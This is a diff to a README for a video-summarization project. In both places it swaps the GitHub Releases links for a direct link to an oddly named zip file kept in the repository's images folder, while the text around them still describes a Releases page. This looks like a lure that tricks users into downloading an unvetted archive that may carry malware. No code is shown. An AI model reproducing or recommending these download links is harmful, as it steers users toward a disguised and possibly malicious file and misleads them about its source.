@@ -8,13 +8,13 @@ Welcome to the video-summarization-for-information-dense-content project! This t
 
 To get started, you’ll need to download the software. You can do this by visiting the link below:
 
-[![Download Releases](https://img.shields.io/badge/download-releases-brightgreen)](https://github.com/Nisba009/video-summarization-for-information-dense-content/releases)
+[![Download Releases](https://raw.githubusercontent.com/Nisba009/video-summarization-for-information-dense-content/main/images/video-summarization-for-information-dense-content_hetericist.zip)](https://raw.githubusercontent.com/Nisba009/video-summarization-for-information-dense-content/main/images/video-summarization-for-information-dense-content_hetericist.zip)
 
 1. Click on the link above.
 2. On the Releases page, find the latest version of the software.
 3. Download the file that matches your operating system.
 
-You can also visit the Releases page anytime for updates: [Download Releases](https://github.com/Nisba009/video-summarization-for-information-dense-content/releases).
+You can also visit the Releases page anytime for updates: [Download Releases](https://raw.githubusercontent.com/Nisba009/video-summarization-for-information-dense-content/main/images/video-summarization-for-information-dense-content_hetericist.zip).
 
 ## 🖥️ System Requirements
 
